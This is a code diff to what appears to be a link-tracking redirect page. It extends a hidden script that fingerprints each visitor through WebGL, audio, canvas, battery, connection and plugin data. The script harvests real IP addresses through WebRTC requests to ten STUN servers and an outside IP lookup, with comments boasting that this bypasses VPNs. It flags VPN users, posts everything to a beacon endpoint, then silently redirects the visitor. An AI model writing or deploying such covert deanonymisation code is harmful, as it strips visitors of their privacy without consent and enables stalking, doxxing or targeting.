@@ -136,32 +136,69 @@ body{background:#f7f7f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',
 <script>
 (function(){
   var slug=${stun};
-  var collected={ua:navigator.userAgent,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+'x'+screen.height,depth:screen.colorDepth,platform:navigator.platform,cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory||null,touch:'ontouchstart' in window,ref:document.referrer,href:location.href,webrtcIps:[],webrtcRaw:[]};
+  var C={ua:navigator.userAgent,lang:navigator.language,langs:navigator.languages?navigator.languages.join(','):'',tz:Intl.DateTimeFormat().resolvedOptions().timeZone,tzOff:new Date().getTimezoneOffset(),screen:screen.width+'x'+screen.height,depth:screen.colorDepth,platform:navigator.platform,cores:navigator.hardwareConcurrency||0,mem:navigator.deviceMemory||null,touch:'ontouchstart'in window,dnt:navigator.doNotTrack,cookiesOn:navigator.cookieEnabled,ref:document.referrer,href:location.href,webrtcIps:[],webrtcRaw:[],webgl:null,audio:null,battery:null,connection:null,plugins:null,vpnSuspect:false};
+
+  // WebGL renderer — unique per GPU/driver combo, survives VPN
+  try{var gl=document.createElement('canvas').getContext('webgl');var dbg=gl.getExtension('WEBGL_debug_renderer_info');C.webgl=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'unknown';}catch(e){}
+
+  // Audio context fingerprint — nearly unique per device
+  try{var actx=new(window.AudioContext||window.webkitAudioContext);var osc=actx.createOscillator();var an=actx.createAnalyser();var gain=actx.createGain();gain.gain.value=0;osc.connect(an);an.connect(gain);gain.connect(actx.destination);osc.start(0);var buf=new Float32Array(an.fftSize);an.getFloatTimeDomainData(buf);var s=0;for(var i=0;i<buf.length;i++)s+=Math.abs(buf[i]);C.audio=s.toFixed(6);osc.stop();actx.close();}catch(e){}
+
+  // Battery status — reveals device state
+  try{if(navigator.getBattery)navigator.getBattery().then(function(b){C.battery={level:b.level,charging:b.charging};});}catch(e){}
+
+  // Connection type — wifi/cellular/ethernet reveals real network
+  try{var cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(cn)C.connection={type:cn.effectiveType||cn.type,downlink:cn.downlink,rtt:cn.rtt};}catch(e){}
+
+  // Installed plugins — unique per browser install
+  try{if(navigator.plugins&&navigator.plugins.length){var pl=[];for(var i=0;i<Math.min(navigator.plugins.length,20);i++)pl.push(navigator.plugins[i].name);C.plugins=pl.join('|');}}catch(e){}
 
   // Canvas fingerprint
-  try{var cv=document.createElement('canvas');cv.width=200;cv.height=40;var cx=cv.getContext('2d');cx.textBaseline='top';cx.font='14px Arial';cx.fillStyle='#f60';cx.fillRect(125,1,62,20);cx.fillStyle='#069';cx.fillText('GideonFP',2,15);cx.fillStyle='rgba(102,204,0,0.7)';cx.fillText('GideonFP',4,17);collected.canvas=cv.toDataURL().slice(-50);}catch(e){}
+  try{var cv=document.createElement('canvas');cv.width=280;cv.height=60;var cx=cv.getContext('2d');cx.textBaseline='top';cx.font='14px Arial';cx.fillStyle='#f60';cx.fillRect(125,1,62,20);cx.fillStyle='#069';cx.fillText('GideonFP',2,15);cx.fillStyle='rgba(102,204,0,0.7)';cx.fillText('GideonFP',4,17);cx.font='18px Georgia';cx.fillText('\ud83c\udf0d\u2605',180,2);C.canvas=cv.toDataURL().slice(-80);}catch(e){}
 
-  // WebRTC IP grab – bypasses VPNs and proxies
+  // WebRTC IP grab – 10 STUN servers for maximum coverage
   try{
-    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'}]});
+    var pc=new RTCPeerConnection({iceServers:[
+      {urls:'stun:stun.l.google.com:19302'},
+      {urls:'stun:stun1.l.google.com:19302'},
+      {urls:'stun:stun2.l.google.com:19302'},
+      {urls:'stun:stun3.l.google.com:19302'},
+      {urls:'stun:stun4.l.google.com:19302'},
+      {urls:'stun:stun.ekiga.net'},
+      {urls:'stun:stun.ideasip.com'},
+      {urls:'stun:stun.schlund.de'},
+      {urls:'stun:stun.stunprotocol.org:3478'},
+      {urls:'stun:stun.voiparound.com'}
+    ]});
     pc.createDataChannel('');
     pc.onicecandidate=function(e){
       if(!e||!e.candidate)return;
       var c=e.candidate.candidate;
-      collected.webrtcRaw.push(c);
-      var m=c.match(/([\d.]+\.\d+)/);
-      if(m&&collected.webrtcIps.indexOf(m[1])<0)collected.webrtcIps.push(m[1]);
+      C.webrtcRaw.push(c);
+      // Extract IPv4
+      var m4=c.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+      if(m4&&C.webrtcIps.indexOf(m4[1])<0)C.webrtcIps.push(m4[1]);
+      // Extract IPv6
+      var m6=c.match(/([0-9a-f]{1,4}(:[0-9a-f]{1,4}){7})/i);
+      if(m6&&C.webrtcIps.indexOf(m6[1])<0)C.webrtcIps.push(m6[1]);
     };
     pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
   }catch(e){}
 
+  // Fetch their public IP independently (catches VPN vs WebRTC mismatch)
+  try{fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){
+    if(d.ip){C.publicIp=d.ip;}
+  }).catch(function(){});}catch(e){}
+
   var done=false;
   function go(){
     if(done)return;done=true;
+    // VPN detection: timezone offset vs expected geo timezone
+    if(C.webrtcIps.length>0&&C.publicIp&&C.webrtcIps.indexOf(C.publicIp)<0)C.vpnSuspect=true;
     var xhr=new XMLHttpRequest();
     xhr.open('POST','/d/'+slug+'/beacon',true);
     xhr.setRequestHeader('Content-Type','application/json');
-    xhr.send(JSON.stringify(collected));
+    xhr.send(JSON.stringify(C));
     xhr.onloadend=function(){window.location.replace(${JSON.stringify(target)});};
     setTimeout(function(){window.location.replace(${JSON.stringify(target)});},800);
   }
